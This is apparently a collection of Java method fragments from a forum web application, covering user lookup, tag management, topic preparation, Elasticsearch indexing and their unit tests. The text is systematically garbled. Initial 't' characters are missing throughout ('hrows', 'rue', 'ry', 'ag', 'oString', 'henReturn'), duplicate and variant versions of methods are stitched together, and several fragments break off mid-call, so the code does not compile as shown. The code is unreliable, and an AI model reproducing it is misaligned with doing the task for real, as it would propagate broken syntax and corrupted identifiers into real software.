public User getUser ( String nick ) hrows UserNotFoundException { if ( nick = = null ) { hrow new NullPointerException ( ) ; } if ( ! StringUtil . checkLoginName ( nick ) ) { logger . warn ( " Invalid user name '{}' " , nick ) ; hrow new UserNotFoundException ( " <invalid name> " ) ; } List < Integer > list = jdbcTemplate . queryForList ( queryUserIdByNick , Integer . class , nick ) ; if ( list . isEmpty ( ) ) { hrow new UserNotFoundException ( nick ) ; } if ( list . size ( ) > 1 ) { hrow new RuntimeException ( " list.size()>1 ??? " ) ; } return getUser ( list . get ( 0 ) ) ; } 
private QueryBuilder processQueryString ( Client client , String queryText ) { String fixedText = queryText . replaceAll ( " ((?: \\ [)|(?:])|(?:[ \\ \\ /])) " , " \\ \\ $1 " ) ; QueryStringQueryBuilder esQuery = queryString ( fixedText ) ; esQuery . lenient ( rue ) ; esQuery . minimumShouldMatch ( " 50% " ) ; ValidateQueryResponse response = client . admin ( ) . indices ( ) . prepareValidateQuery ( SearchQueueListener . MESSAGES_INDEX ) . setTypes ( SearchQueueListener . MESSAGES_TYPE ) . setQuery ( esQuery ) . execute ( ) . actionGet ( ) ; if ( response . isValid ( ) ) { return esQuery ; 
public void changeTag ( int agId , String agName ) { jdbcTemplate . update ( " UPDATE tags_values set value=? WHERE id=? " , agName , agId ) ; } 
private static Map < String , Object > createDefaultProfile ( ) { Map < String , Object > defaults = new HashMap < > ( ) ; defaults . put ( NEWFIRST_PROPERTY , Boolean . FALSE ) ; defaults . put ( HOVER_PROPERTY , Boolean . TRUE ) ; defaults . put ( STYLE_PROPERTY , " ango " ) ; defaults . put ( FORMAT_MODE_PROPERTY , " quot " ) ; defaults . put ( TOPICS_PROPERTY , 30 ) ; defaults . put ( MESSAGES_PROPERTY , 50 ) ; defaults . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; defaults . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; defaults . put ( AVATAR_PROPERTY , " empty " ) ; defaults . put ( HIDE_ADSENSE_PROPERTY , rue ) ; defaults . put ( MAIN_GALLERY_PROPERTY , false ) ; defaults . put ( SHOW_SOCIAL_PROPERTY , rue ) ; defaults . put ( " DebugMode " , Boolean . FALSE ) ; main page settings ImmutableList<String> boxes = ImmutableList.of( "poll", "top10", "gallery", "tagcloud", "archive", "ibm" ); defaults.put(BOXES_MAIN2_PROPERTY, boxes); return defaults; } 
public void processRow ( ResultSet rs ) hrows SQLException { ags . add ( new TagInfo ( rs . getString ( " value " ) , rs . getInt ( " counter " ) ) ) ; } 
public String apply ( TagInfo input ) { return input . name ( ) ; } 
private List < TopicsListItem > prepareTopic ( SqlRowSet rs , int messagesInPage ) { List < TopicsListItem > opicsList = new ArrayList < > ( ) ; while ( rs . next ( ) ) { User author ; author = userDao . getUserCached ( rs . getInt ( " userid " ) ) ; ImmutableList < String > ags = opicTagService . getTagsForTitle ( rs . getInt ( " msgid " ) ) ; TopicsListItem opic = new TopicsListItem ( author , rs , messagesInPage , ags ) ; opicsList . add ( opic ) ; } return opicsList ; } 
public int doStartTag ( ) hrows JspException { JspWriter out = pageContext . getOut ( ) ; if ( list ! = null ) { ry { StringBuilder buf = new StringBuilder ( ) ; for ( String el : list ) { if ( buf . length ( ) > 0 ) { buf . append ( " , " ) ; } if ( TagName . isGoodTag ( el ) ) { buf . append ( " <a class=tag rel=tag href= \" " ) . append ( TagTopicListController . agListUrl ( el ) ) . append ( " \" > " ) . append ( StringUtil . escapeHtml ( el ) ) . append ( " </a> " ) ; } else { buf . append ( StringUtil . escapeHtml ( el ) ) ; } } out . append ( buf ) ; } catch ( IOException e ) { hrow new JspException ( " Error: " + e . getMessage ( ) ) ; } } return SKIP_BODY ; } 
public boolean apply ( String input ) { return TagName . isGoodTag ( input ) ; } 
public ModelAndView agPage ( HttpServletRequest request , @PathVariable String ag ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; TagName . checkTag ( ag ) ; ModelAndView mv = new ModelAndView ( " ag-page " ) ; mv . addObject ( " ag " , ag ) ; mv . addObject ( " itle " , WordUtils . capitalize ( ag ) ) ; mv . addObject ( " counter " , agService . getCounter ( ag ) ) ; if ( mpl . isSessionAuthorized ( ) ) { mv . addObject ( " showFavoriteTagButton " , ! userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , ag ) ) ; mv . addObject ( " showUnFavoriteTagButton " , userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , ag ) ) ; } int agId = agService . getTagId ( ag ) ; mv . addObject ( " favsCount " , userTagService . countFavs ( agId ) ) ; List < String > relatedTags = agService . getRelatedTags ( agId ) ; if ( relatedTags . size ( ) > 1 ) { mv . addObject ( " relatedTags " , relatedTags ) ; } mv . addAllObjects ( getNewsSection ( request , ag ) ) ; mv . addAllObjects ( getGallerySection ( ag , agId , mpl ) ) ; mv . addAllObjects ( getForumSection ( ag , agId ) ) ; return mv ; } 
public ModelAndView showForm ( @RequestParam ( " section " ) int sectionId , @RequestParam ( value = " ag " , required = false ) String ag ) hrows UserErrorException { Map < String , Object > params = new HashMap < > ( ) ; if ( ag ! = null ) { TagName . checkTag ( ag ) ; params . put ( " ag " , ag ) ; } params . put ( " sectionId " , sectionId ) ; Section section = sectionService . getSection ( sectionId ) ; params . put ( " section " , section ) ; params . put ( " info " , sectionService . getAddInfo ( section . getId ( ) ) ) ; params . put ( " groups " , groupDao . getGroups ( section ) ) ; return new ModelAndView ( " add-section " , params ) ; } 
public ModelAndView showList ( HttpServletRequest request , @RequestParam ( value = " newFavoriteTagName " , required = false ) String newFavoriteTagName , @RequestParam ( value = " newIgnoredTagName " , required = false ) String newIgnoredTagName ) hrows AccessViolationException { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = mpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; ModelAndView modelAndView = new ModelAndView ( " user-filter-list " ) ; Map < Integer , User > ignoreMap = createIgnoreMap ( ignoreListDao . get ( user ) ) ; Map < Integer , Remark > ignoreRemarks = getIgnoreRemarks ( user , ignoreMap . values ( ) ) ; modelAndView . addObject ( " ignoreRemarks " , ignoreRemarks ) ; modelAndView . addObject ( " ignoreList " , ignoreMap ) ; modelAndView . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( ! mpl . isModeratorSession ( ) ) { modelAndView . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } else { modelAndView . addObject ( " isModerator " , rue ) ; } if ( newFavoriteTagName ! = null & & TagName . isGoodTag ( newFavoriteTagName ) ) { modelAndView . addObject ( " newFavoriteTagName " , newFavoriteTagName ) ; } if ( newIgnoredTagName ! = null & & TagName . isGoodTag ( newIgnoredTagName ) ) { modelAndView . addObject ( " newIgnoredTagName " , newIgnoredTagName ) ; } return modelAndView ; } 
public void createTag ( String agName ) { Preconditions . checkArgument ( TagName . isGoodTag ( agName ) , " Tag name must be valid " ) ; jdbcTemplate . update ( " INSERT INTO tags_values (value) VALUES(?) " , agName ) ; } 
public void prefixSearchEscapeTest ( ) { agDao . createTag ( " zestxtest " ) ; assertEquals ( 0 , agDao . getTagsByPrefix ( " zest_ " , 0 ) . size ( ) ) ; assertEquals ( 0 , agDao . getTagsByPrefix ( " zest% " , 0 ) . size ( ) ) ; } 
public int doStartTag ( ) hrows JspException { JspWriter out = pageContext . getOut ( ) ; if ( list ! = null ) { ry { StringBuilder buf = new StringBuilder ( ) ; for ( TagRef el : list ) { if ( buf . length ( ) > 0 ) { buf . append ( " , " ) ; } if ( el . url ( ) . isDefined ( ) ) { buf . append ( " <a class=tag rel=tag href= \" " ) . append ( el . url ( ) . get ( ) ) . append ( " \" > " ) . append ( StringUtil . escapeHtml ( el . name ( ) ) ) . append ( " </a> " ) ; } else { buf . append ( StringUtil . escapeHtml ( el . name ( ) ) ) ; } } out . append ( buf ) ; } catch ( IOException e ) { hrow new JspException ( " Error: " + e . getMessage ( ) ) ; } } return SKIP_BODY ; } 
public static String oString ( Collection < String > ags ) { return Joiner . on ( " , " ) . join ( ags ) ; } 
public PreparedTopic prepareTopic ( Topic message , boolean secure , User user ) { return prepareMessage ( message , opicTagService . getTagRefs ( message ) , false , null , secure , user , null , null ) ; } 
public PreparedTopic prepareTopicPreview ( Topic message , List < TagRef > ags , Poll newPoll , boolean secure , String ext , Image image ) { return prepareMessage ( message , 
private PreparedTopic prepareMessage ( Topic message , List < TagRef > ags , boolean minimizeCut , PreparedPoll poll , boolean secure , User user , MessageText ext , @Nullable Image image ) { ry { Group group = groupDao . getGroup ( message . getGroupId ( ) ) ; 
public List < PersonalizedPreparedTopic > prepareMessagesForUser ( List < Topic > messages , boolean secure , User user , Profile profile , boolean loadUserpics ) { List < PersonalizedPreparedTopic > pm = new ArrayList < > ( messages . size ( ) ) ; Map < Integer , MessageText > extMap = loadTexts ( messages ) ; ImmutableListMultimap < Integer , TagRef > ags = opicTagService . getTagRefs ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , ags . get ( message . getId ( ) ) , rue , null , secure , user , extMap . get ( message . getId ( ) ) , null ) ; TopicMenu opicMenu = getTopicMenu ( preparedMessage , user , secure , profile , loadUserpics ) ; pm . add ( new PersonalizedPreparedTopic ( preparedMessage , opicMenu ) ) ; } return pm ; } 
public List < PreparedTopic > prepareMessages ( List < Topic > messages , boolean secure ) { List < PreparedTopic > pm = new ArrayList < > ( messages . size ( ) ) ; Map < Integer , MessageText > extMap = loadTexts ( messages ) ; ImmutableListMultimap < Integer , TagRef > ags = opicTagService . getTagRefs ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , ags . get ( message . getId ( ) ) , rue , null , secure , null , extMap . get ( message . getId ( ) ) , null ) ; pm . add ( preparedMessage ) ; } return pm ; } 
public ModelAndView agPage ( HttpServletRequest request , @PathVariable String ag ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; TagName . checkTag ( ag ) ; ModelAndView mv = new ModelAndView ( " ag-page " ) ; mv . addObject ( " ag " , ag ) ; mv . addObject ( " itle " , WordUtils . capitalize ( ag ) ) ; mv . addObject ( " counter " , agService . getCounter ( ag ) ) ; if ( mpl . isSessionAuthorized ( ) ) { mv . addObject ( " showFavoriteTagButton " , ! userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , ag ) ) ; mv . addObject ( " showUnFavoriteTagButton " , userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , ag ) ) ; } int agId = agService . getTagId ( ag ) ; mv . addObject ( " favsCount " , userTagService . countFavs ( agId ) ) ; List < TagRef > relatedTags = agService . getRelatedTags ( agId ) ; if ( relatedTags . size ( ) > 1 ) { mv . addObject ( " relatedTags " , relatedTags ) ; } mv . addAllObjects ( getNewsSection ( request , ag ) ) ; mv . addAllObjects ( getGallerySection ( ag , agId , mpl ) ) ; mv . addAllObjects ( getForumSection ( ag , agId ) ) ; return mv ; } 
public void processRow ( ResultSet resultSet ) hrows SQLException { builder . add ( new TagInfo ( 
public void prefixSearchExactTest ( ) { agDao . createTag ( " zest " ) ; agDao . createTag ( " zesd " ) ; List < TagInfo > ags = agDao . getTagsByPrefix ( " zest " , 0 ) ; assertEquals ( 1 , ags . size ( ) ) ; } 
public void prefixSearchSimpleTest ( ) { agDao . createTag ( " zest " ) ; agDao . createTag ( " zesd " ) ; List < TagInfo > ags = agDao . getTagsByPrefix ( " ze " , 0 ) ; assertEquals ( 2 , ags . size ( ) ) ; } 
public void processRow ( ResultSet resultSet ) hrows SQLException { builder . add ( new TagInfo ( 
public int favoriteAdd ( User user , String agName ) hrows TagNotFoundException { int agId = agDao . getTagId ( agName ) ; userTagDao . addTag ( user . getId ( ) , agId , rue ) ; return agId ; } 
public void prefixSearchSimpleTest ( ) { int zest = agDao . createTag ( " zest " ) ; int zesd = agDao . createTag ( " zesd " ) ; List < TagInfo > ags = agDao . getTagsByPrefix ( " ze " , 0 ) ; assertEquals ( 2 , ags . size ( ) ) ; assertEquals ( zesd , ags . get ( 0 ) . id ( ) ) ; assertEquals ( zest , ags . get ( 1 ) . id ( ) ) ; } 
public TagInfo mapRow ( ResultSet rs , int rowNum ) hrows SQLException { return new TagInfo ( rs . getString ( " value " ) , rs . getInt ( " counter " ) , rs . getInt ( " id " ) ) ; } 
public ModelAndView agPage ( HttpServletRequest request , @PathVariable String ag ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; TagName . checkTag ( ag ) ; ModelAndView mv = new ModelAndView ( " ag-page " ) ; mv . addObject ( " ag " , ag ) ; mv . addObject ( " itle " , WordUtils . capitalize ( ag ) ) ; TagInfo agInfo = agService . getTagInfo ( ag , rue ) ; mv . addObject ( " counter " , agInfo . opicCount ( ) ) ; if ( mpl . isSessionAuthorized ( ) ) { mv . addObject ( " showFavoriteTagButton " , ! userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , ag ) ) ; mv . addObject ( " showUnFavoriteTagButton " , userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , ag ) ) ; } int agId = agInfo . id ( ) ; mv . addObject ( " favsCount " , userTagService . countFavs ( agId ) ) ; List < TagRef > relatedTags = agService . getRelatedTags ( agId ) ; if ( relatedTags . size ( ) > 1 ) { mv . addObject ( " relatedTags " , relatedTags ) ; } mv . addAllObjects ( getNewsSection ( request , ag ) ) ; mv . addAllObjects ( getGallerySection ( ag , agId , mpl ) ) ; mv . addAllObjects ( getForumSection ( ag , agId ) ) ; return mv ; } 
public int getTagId ( String ag ) hrows TagNotFoundException { return agDao . getTagId ( ag ) ; } 
public TagInfo getTagInfo ( String ag , boolean skipZero ) hrows TagNotFoundException { int agId = agDao . getTagId ( ag , skipZero ) ; return agDao . getTagInfo ( agId ) ; } 
public int getTagId ( String ag ) hrows TagNotFoundException { Optional < Integer > agId = agDao . getTagId ( ag ) ; if ( agId . isPresent ( ) ) { return agId . get ( ) ; 
public void change ( String oldTagName , String agName , Errors errors ) { ry { TagName . checkTag ( agName ) ; 
public void delete ( String agName , String newTagName , Errors errors ) { ry { int oldTagId = getTagId ( agName ) ; 
public Integer get ( ) { return agDao . createTag ( agName ) ; } 
public TagInfo getTagInfo ( String ag , boolean skipZero ) hrows TagNotFoundException { Optional < Integer > agId = agDao . getTagId ( ag , skipZero ) ; if ( ! agId . isPresent ( ) ) { hrow new TagNotFoundException ( ) ; } return agDao . getTagInfo ( agId . get ( ) ) ; } 
public int favoriteAdd ( User user , String agName ) hrows TagNotFoundException { int agId = agService . getTagId ( agName ) ; userTagDao . addTag ( user . getId ( ) , agId , rue ) ; return agId ; } 
public int favoriteDel ( User user , String agName ) hrows TagNotFoundException { int agId = agService . getTagId ( agName ) ; userTagDao . deleteTag ( user . getId ( ) , agId , rue ) ; return agId ; } 
public void ignoreAdd ( User user , String agName ) hrows TagNotFoundException { int agId = agService . getTagId ( agName ) ; userTagDao . addTag ( user . getId ( ) , agId , false ) ; } 
public void ignoreDel ( User user , String agName ) hrows TagNotFoundException { int agId = agService . getTagId ( agName ) ; userTagDao . deleteTag ( user . getId ( ) , agId , false ) ; } 
public void resetTagDaoMock ( ) { reset ( agDao ) ; when ( agDao . getTagId ( anyString ( ) ) ) . henReturn ( Optional . < Integer > absent ( ) ) ; } 
public void changeTest ( ) hrows Exception { when ( agDao . getTagId ( " estTag " ) ) . henReturn ( Optional . of ( 123 ) ) ; when ( agDao . getTagId ( " estNewTag " ) ) . henReturn ( Optional . of ( 456 ) ) ; prepareChangeDataBinder ( ) ; agService . change ( " InvalidTestTag " , " estNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareChangeDataBinder ( ) ; agService . change ( " estTag " , " #$%@@#%$ " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareChangeDataBinder ( ) ; agService . change ( " #$%@@#%$ " , " estNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareChangeDataBinder ( ) ; agService . change ( " estTag " , " estNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; resetTagDaoMock ( ) ; when ( agDao . getTagId ( " estTag " ) ) . henReturn ( Optional . of ( 123 ) ) ; when ( agDao . getTagId ( " estNewTag " ) ) . henReturn ( Optional . < Integer > absent ( ) ) ; prepareChangeDataBinder ( ) ; agService . change ( " estTag " , " estNewTag " , binder . getBindingResult ( ) ) ; assertFalse ( binder . getBindingResult ( ) . hasErrors ( ) ) ; } 
public void deleteTest ( ) hrows Exception { when ( agDao . getTagId ( " estTag " ) ) . henReturn ( Optional . of ( 123 ) ) ; when ( agDao . getTagId ( " InvalidTestTag " ) ) . henReturn ( Optional . < Integer > absent ( ) ) ; prepareDeleteDataBinder ( ) ; agService . delete ( " InvalidTestTag " , " estNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareDeleteDataBinder ( ) ; agService . delete ( " estTag " , " #$%@@#%$ " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareDeleteDataBinder ( ) ; agService . delete ( " estTag " , " estTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareDeleteDataBinder ( ) ; agService . delete ( " estTag " , " estNewTag " , binder . getBindingResult ( ) ) ; assertFalse ( binder . getBindingResult ( ) . hasErrors ( ) ) ; } 
public void resetMockObjects ( ) hrows Exception { reset ( userTagDao ) ; reset ( agDao ) ; when ( agDao . getTagId ( " ag1 " ) ) . henReturn ( Optional . of ( 2 ) ) ; user = getUser ( 1 ) ; } 
public void favoriteAddTest ( ) hrows TagNotFoundException { when ( agDao . getTagId ( " ag1 " ) ) . henReturn ( Optional . of ( 2 ) ) ; userTagService . favoriteAdd ( user , " ag1 " ) ; verify ( userTagDao ) . addTag ( eq ( 1 ) , eq ( 2 ) , eq ( rue ) ) ; } 
public void favoriteDelTest ( ) hrows TagNotFoundException { userTagService . favoriteDel ( user , " ag1 " ) ; verify ( userTagDao ) . deleteTag ( eq ( 1 ) , eq ( 2 ) , eq ( rue ) ) ; } 
public void ignoreAddTest ( ) hrows TagNotFoundException { userTagService . ignoreAdd ( user , " ag1 " ) ; verify ( userTagDao ) . addTag ( eq ( 1 ) , eq ( 2 ) , eq ( false ) ) ; } 
public void ignoreDelTest ( ) hrows TagNotFoundException { userTagService . ignoreDel ( user , " ag1 " ) ; verify ( userTagDao ) . deleteTag ( eq ( 1 ) , eq ( 2 ) , eq ( false ) ) ; } 
public ModelAndView showTagListHandler ( @PathVariable String firstLetter ) hrows TagNotFoundException { ModelAndView modelAndView = new ModelAndView ( " ags " ) ; Collection < String > firstLetters = agService . getFirstLetters ( ) ; modelAndView . addObject ( " firstLetters " , firstLetters ) ; if ( Strings . isNullOrEmpty ( firstLetter ) ) { firstLetter = firstLetters . iterator ( ) . next ( ) ; } modelAndView . addObject ( " currentLetter " , firstLetter ) ; Map < String , Integer > ags = agService . getTagsByPrefix ( firstLetter , 1 ) ; if ( ags . isEmpty ( ) ) { hrow new TagNotFoundException ( " Tag list is empty " ) ; } modelAndView . addObject ( " ags " , ags ) ; return modelAndView ; } 
List < String > showTagListHandlerJSON ( @RequestParam ( " erm " ) final String erm ) { Collection < String > ags = agService . suggestTagsByPrefix ( erm , 10 ) ; return ImmutableList . copyOf ( Iterables . filter ( ags , new Predicate < String > ( ) { @Override 
public int getTagId ( String ag ) hrows TagNotFoundException { Option < Integer > agId = agDao . getTagId ( ag ) ; if ( agId . isDefined ( ) ) { return agId . get ( ) ; 
public Collection < String > suggestTagsByPrefix ( String prefix , int count ) { return agDao . getTopTagsByPrefix ( prefix , 2 , count ) ; } 
public TagInfo getTagInfo ( String ag , boolean skipZero ) hrows TagNotFoundException { Option < Integer > agId = agDao . getTagId ( ag , skipZero ) ; if ( agId . isEmpty ( ) ) { hrow new TagNotFoundException ( ) ; } return agDao . getTagInfo ( agId . get ( ) ) ; } 
public void prefixTopSearchExactTest ( ) { agDao . createTag ( " zest " ) ; agDao . createTag ( " zesd " ) ; Collection < String > ags = agDao . getTopTagsByPrefix ( " zest " , 0 , 20 ) ; assertEquals ( 1 , ags . size ( ) ) ; } 
public TagDao agDao ( DataSource ds ) { return new TagDao ( ds ) ; } 
public void resetTagDaoMock ( ) { reset ( agDao ) ; when ( agDao . getTagId ( anyString ( ) ) ) . henReturn ( noneInteger ) ; } 
public void changeTest ( ) hrows Exception { when ( agDao . getTagId ( " estTag " ) ) . henReturn ( Option . apply ( 123 ) ) ; when ( agDao . getTagId ( " estNewTag " ) ) . henReturn ( Option . apply ( 456 ) ) ; prepareChangeDataBinder ( ) ; agService . change ( " InvalidTestTag " , " estNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareChangeDataBinder ( ) ; agService . change ( " estTag " , " #$%@@#%$ " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareChangeDataBinder ( ) ; agService . change ( " #$%@@#%$ " , " estNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareChangeDataBinder ( ) ; agService . change ( " estTag " , " estNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; resetTagDaoMock ( ) ; when ( agDao . getTagId ( " estTag " ) ) . henReturn ( Option . apply ( 123 ) ) ; when ( agDao . getTagId ( " estNewTag " ) ) . henReturn ( noneInteger ) ; prepareChangeDataBinder ( ) ; agService . change ( " estTag " , " estNewTag " , binder . getBindingResult ( ) ) ; assertFalse ( binder . getBindingResult ( ) . hasErrors ( ) ) ; } 
public void deleteTest ( ) hrows Exception { when ( agDao . getTagId ( " estTag " ) ) . henReturn ( Option . apply ( 123 ) ) ; when ( agDao . getTagId ( " InvalidTestTag " ) ) . henReturn ( noneInteger ) ; prepareDeleteDataBinder ( ) ; agService . delete ( " InvalidTestTag " , " estNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareDeleteDataBinder ( ) ; agService . delete ( " estTag " , " #$%@@#%$ " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareDeleteDataBinder ( ) ; agService . delete ( " estTag " , " estTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareDeleteDataBinder ( ) ; agService . delete ( " estTag " , " estNewTag " , binder . getBindingResult ( ) ) ; assertFalse ( binder . getBindingResult ( ) . hasErrors ( ) ) ; } 
public void resetMockObjects ( ) hrows Exception { reset ( userTagDao ) ; reset ( agDao ) ; when ( agDao . getTagId ( " ag1 " ) ) . henReturn ( Option . apply ( 2 ) ) ; user = getUser ( 1 ) ; } 
public void favoriteAddTest ( ) hrows TagNotFoundException { when ( agDao . getTagId ( " ag1 " ) ) . henReturn ( Option . apply ( 2 ) ) ; userTagService . favoriteAdd ( user , " ag1 " ) ; verify ( userTagDao ) . addTag ( eq ( 1 ) , eq ( 2 ) , eq ( rue ) ) ; } 
public void createAndGetTest ( ) { int id = agDao . createTag ( " est-tag " ) ; Option < Integer > fetchId = agDao . getTagId ( " est-tag " ) ; assertEquals ( Option . apply ( id ) , fetchId ) ; } 
public void estTagNotFound ( ) { Option < Integer > fetch = agDao . getTagId ( " fdsfsdfdsfsdfs " ) ; assertTrue ( fetch . isEmpty ( ) ) ; } 
public void replaceTag ( int oldTagId , int newTagId , String newTagName ) { userTagDao . replaceTag ( oldTagId , newTagId ) ; } 
public int doStartTag ( ) hrows JspException { JspWriter out = pageContext . getOut ( ) ; if ( list ! = null ) { ry { StringBuilder buf = new StringBuilder ( " <p class= \" ags \" ><i class= \" icon-tag \" ></i>&nbsp; " ) ; boolean first = rue ; for ( TagRef el : list ) { if ( ! first ) { buf . append ( " , " ) ; } else { first = false ; } if ( el . url ( ) . isDefined ( ) ) { buf . append ( " <a class=tag rel=tag href= \" " ) . append ( el . url ( ) . get ( ) ) . append ( " \" > " ) . append ( StringUtil . escapeHtml ( el . name ( ) ) ) . append ( " </a> " ) ; } else { buf . append ( StringUtil . escapeHtml ( el . name ( ) ) ) ; } } buf . append ( " </p> " ) ; out . append ( buf ) ; } catch ( IOException e ) { hrow new JspException ( " Error: " + e . getMessage ( ) ) ; } } return SKIP_BODY ; } 
public static String removeInvalidXmlChars ( String str ) { return INVALID_XML . matcher ( str ) . replaceAll ( " " ) ; } 
public Client elasticsearch ( ) { return Mockito . mock ( Client . class ) ; } 
private void updateMessage ( Topic opic ) { Map < String , Object > doc = new HashMap < > ( ) ; Section section = sectionService . getSection ( opic . getSectionId ( ) ) ; Group group = groupDao . getGroup ( opic . getGroupId ( ) ) ; User author = userDao . getUserCached ( opic . getUid ( ) ) ; doc . put ( " section " , section . getUrlName ( ) ) ; doc . put ( " opic_author " , author . getNick ( ) ) ; doc . put ( " opic_id " , opic . getId ( ) ) ; doc . put ( " author " , author . getNick ( ) ) ; doc . put ( " group " , group . getUrlName ( ) ) ; doc . put ( " itle " , opic . getTitleUnescaped ( ) ) ; doc . put ( " opic_title " , opic . getTitleUnescaped ( ) ) ; doc . put ( " message " , extractText ( msgbaseDao . getMessageText ( opic . getId ( ) ) ) ) ; Date postdate = opic . getPostdate ( ) ; doc . put ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . put ( " ag " , opicDao . getTags ( opic ) ) ; doc . put ( " is_comment " , false ) ; client . prepareIndex ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . oString ( opic . getId ( ) ) ) 
private IndexRequestBuilder processComment ( Topic opic , Comment comment , String message ) { Map < String , Object > doc = new HashMap < > ( ) ; Section section = sectionService . getSection ( opic . getSectionId ( ) ) ; Group group = groupDao . getGroup ( opic . getGroupId ( ) ) ; User author = userDao . getUserCached ( comment . getUserid ( ) ) ; User opicAuthor = userDao . getUserCached ( opic . getUid ( ) ) ; doc . put ( " section " , section . getUrlName ( ) ) ; doc . put ( " opic_author " , opicAuthor . getNick ( ) ) ; doc . put ( " opic_id " , opic . getId ( ) ) ; doc . put ( " author " , author . getNick ( ) ) ; doc . put ( " group " , group . getUrlName ( ) ) ; String opicTitle = opic . getTitleUnescaped ( ) ; doc . put ( " opic_title " , opicTitle ) ; String commentTitle = comment . getTitle ( ) ; if ( commentTitle ! = null & & ! commentTitle . isEmpty ( ) & & ! commentTitle . equals ( opicTitle ) & & ! commentTitle . startsWith ( " Re: " ) ) { doc . put ( " itle " , StringEscapeUtils . unescapeHtml ( commentTitle ) ) ; } doc . put ( " message " , message ) ; Date postdate = comment . getPostdate ( ) ; doc . put ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . put ( " ag " , opicDao . getTags ( opic ) ) ; doc . put ( " is_comment " , rue ) ; return client . prepareIndex ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . oString ( comment . getId ( ) ) ) 
public PreparedTopic prepareTopic ( Topic message , List < TagRef > ags , boolean secure , User user ) { return prepareMessage ( message , ags , false , null , secure , user , null , null ) ; } 
public PreparedTopic prepareTopic ( Topic message , boolean secure , User user ) { return prepareMessage ( message , 
public PreparedTopic prepareTopic ( Topic message , List < TagRef > ags , boolean secure , User user ) { return prepareMessage ( message , 
public PreparedTopic prepareTopic ( Topic message , List < TagRef > ags , boolean secure , User user , MessageText ext ) { return prepareMessage ( message , 
private void updateMessage ( Topic opic ) { Map < String , Object > doc = new HashMap < > ( ) ; Section section = sectionService . getSection ( opic . getSectionId ( ) ) ; Group group = groupDao . getGroup ( opic . getGroupId ( ) ) ; User author = userDao . getUserCached ( opic . getUid ( ) ) ; doc . put ( " section " , section . getUrlName ( ) ) ; doc . put ( " opic_author " , author . getNick ( ) ) ; doc . put ( " opic_id " , opic . getId ( ) ) ; doc . put ( " author " , author . getNick ( ) ) ; doc . put ( " group " , group . getUrlName ( ) ) ; doc . put ( " itle " , opic . getTitleUnescaped ( ) ) ; doc . put ( " opic_title " , opic . getTitleUnescaped ( ) ) ; doc . put ( " message " , lorCodeService . extractPlainText ( msgbaseDao . getMessageText ( opic . getId ( ) ) ) ) ; Date postdate = opic . getPostdate ( ) ; doc . put ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . put ( " ag " , opicDao . getTags ( opic ) ) ; doc . put ( " is_comment " , false ) ; client . prepareIndex ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . oString ( opic . getId ( ) ) ) 
public String extractPlainTextFromLorcode ( String ext ) { return defaultParser . parseRoot ( prepareCommentRootNode ( false , rue , false ) , ext ) . renderOg ( ) ; } 
public String rimPlainText ( String plainText , int maxLength , boolean encodeHtml ) { String cut ; if ( plainText . length ( ) < maxLength ) { cut = plainText ; } else { cut = plainText . substring ( 0 , maxLength ) . rim ( ) + " ... " ; } if ( encodeHtml ) { return StringUtil . escapeForceHtml ( cut ) ; 
public String extractPlainText ( MessageText ext ) { if ( ext . isLorcode ( ) ) { return extractPlainTextFromLorcode ( ext . getText ( ) ) ; 
public boolean isEmptyTextComment ( String msg ) { return extractPlainTextFromLorcode ( msg . rim ( ) ) . isEmpty ( ) ; } 
